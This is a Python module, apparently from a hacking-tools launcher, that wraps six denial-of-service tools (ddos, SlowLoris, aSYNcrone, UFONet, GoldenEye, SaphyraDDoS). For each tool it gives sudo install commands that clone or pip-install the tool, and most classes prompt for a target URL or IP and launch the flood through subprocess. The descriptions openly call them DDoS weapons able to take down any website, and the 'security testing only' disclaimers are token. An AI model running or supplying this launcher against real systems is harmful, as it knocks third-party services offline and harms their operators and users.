# coding=utf-8
import os
import subprocess
import shlex

from core import HackingTool
from core import HackingToolsCollection


class ddos(HackingTool):
    TITLE = "ddos"
    DESCRIPTION = (
        "Best DDoS Attack Script With 36 Plus Methods. "
        "DDoS attacks\n"
        "for SECURITY TESTING PURPOSES ONLY! "
    )

    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos && sudo pip3 install -r requirements.txt",
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos.git"

    def run(self):
        method = input("Enter Method >> ")
        url = input("Enter URL >> ")
        threads = input("Enter Threads >> ")
        proxylist = input("Enter ProxyList >> ")
        multiple = input("Enter Multiple >> ")
        timer = input("Enter Timer >> ")
        
        # Fix: using proper path and command structure
        subprocess.run([
            "sudo", "python3", 
            os.path.join(os.getcwd(), "ddos", "ddos"),
            method, url, "socks_type5.4.1", threads, 
            proxylist, multiple, timer
        ])


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = (
        "Slowloris is basically an HTTP Denial of Service attack. "
        "It sends lots of HTTP Requests"
    )
    INSTALL_COMMANDS = ["sudo pip3 install slowloris"]

    def run(self):
        target_site = input("Enter Target Site:- ")
        subprocess.run(["slowloris", target_site])


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = (
        "aSYNcrone is a C language based, multifunction SYN Flood "
        "DDoS Weapon.\nDisable the destination system by sending a "
        "SYN packet intensively to the destination."
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone && sudo gcc aSYNcrone.c -o aSYNcrone -lpthread",
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        
        # Fix: using proper path and command structure
        asyncrone_path = os.path.join(os.getcwd(), "aSYNcrone", "aSYNcrone")
        subprocess.run([
            "sudo", asyncrone_path, 
            source_port, target_ip, target_port, "1000"
        ])


class UFONet(HackingTool):
    TITLE = "UFOnet"
    DESCRIPTION = (
        "UFONet - is a free software, P2P and cryptographic "
        "-disruptive \n toolkit- that allows to perform DoS and "
        "DDoS attacks\n"
        "More Usage Visit: https://github.com/epsylon/ufonet"
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/epsylon/ufonet.git",
        "cd ufonet && sudo python3 setup.py install && sudo pip3 install GeoIP python-geoip pygeoip requests pycryptodome pycurl whois scapy-python3",
    ]
    RUN_COMMANDS = ["cd ufonet && sudo python3 ufonet --gui"]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class GoldenEye(HackingTool):
    TITLE = "GoldenEye"
    DESCRIPTION = (
        "GoldenEye is a python3 app for SECURITY TESTING PURPOSES ONLY!\n"
        "GoldenEye is a HTTP DoS Test Tool."
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/jseidl/GoldenEye.git && "
        "chmod -R 755 GoldenEye"
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        target_url = input("Enter Target URL (e.g. http://example.com): ")
        if target_url:
            goldeneye_path = os.path.join(os.getcwd(), "GoldenEye", "goldeneye.py")
            subprocess.run(["sudo", "python3", goldeneye_path, target_url])
        else:
            print("\033[91mError: Target URL required\033[0m")
            print("\033[96mUSAGE: ./goldeneye.py <url> [OPTIONS]\033[0m")


class Saphyra(HackingTool):
    TITLE = "SaphyraDDoS"
    DESCRIPTION = "A complex python code to DDoS any website with a very easy usage!\n"
    INSTALL_COMMANDS = [
        "git clone https://github.com/anonymous24x7/Saphyra-DDoS.git",
        "cd Saphyra-DDoS && chmod +x saphyra.py",
    ]
    PROJECT_URL = "https://github.com/anonymous24x7/Saphyra-DDoS"

    def run(self):
        url = input("Enter url>>> ")
        if url:
            try:
                saphyra_path = os.path.join(os.getcwd(), "Saphyra-DDoS", "saphyra.py") 
                subprocess.run(["python3", saphyra_path, url])
            except Exception as e:
                print(f"Error: {str(e)}")
                print("Enter a valid url.")
        else:
            print("\033[91mError: URL required\033[0m")


class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [ddos(), SlowLoris(), Asyncrone(), UFONet(), GoldenEye(), Saphyra()]
